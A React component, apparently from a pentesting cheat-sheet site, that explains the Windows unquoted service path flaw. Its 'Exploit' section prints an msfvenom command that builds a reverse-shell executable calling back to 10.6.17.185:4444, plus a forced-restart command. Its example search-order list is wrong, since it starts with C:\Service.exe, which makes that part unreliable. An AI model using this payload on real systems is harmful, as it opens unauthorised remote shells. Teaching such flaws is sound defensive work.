import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const UnquotedServicePath = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Unquoted Service Paths is a vulnerability where a Windows service
              contains spaces and isn't enclosed within quotes. This
              vulnerability occurs due to the way the Windows SCM searches for
              executables.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Example</Typography>
            <Typography>Say we have a service path as such:</Typography>
            <SyntaxHighlighter className="syntax" language="powershell">
              {
                "C:\\Program Files\\Development Files\\Devservice Files\\Service.exe"
              }
            </SyntaxHighlighter>
            <Typography mb={-2}>
              In order to run Service.exe, the system will search the following
              paths first.
            </Typography>
            <ul>
              <li>C:\Service.exe</li>
              <li>C:\Program Files\Development.exe</li>
              <li>C:\Program Files\Development Files\Devservice.exe</li>
              <li>
                C:\Program Files\Development Files\Devservice Files\Service.exe
              </li>
            </ul>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Exploit</Typography>
            <Typography>
              With one of the unquoted service path being vulnerable, we can use
              msfvenom to exploit.
            </Typography>
            <SyntaxHighlighter className="syntax" language="powershell">
              {
                "msfvenom -p windows/shell_reverse_tcp LHOST=10.6.17.185 LPORT=4444 -f exe -o Devservice.exe"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography>
              Since this is a service, you will need to either wait till the
              service executes, manually restart the service, or restart the
              machine with{" "}
              <Typography display="inline" className="highlight">
                shutdown /r /t 0
              </Typography>
              .
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default UnquotedServicePath;
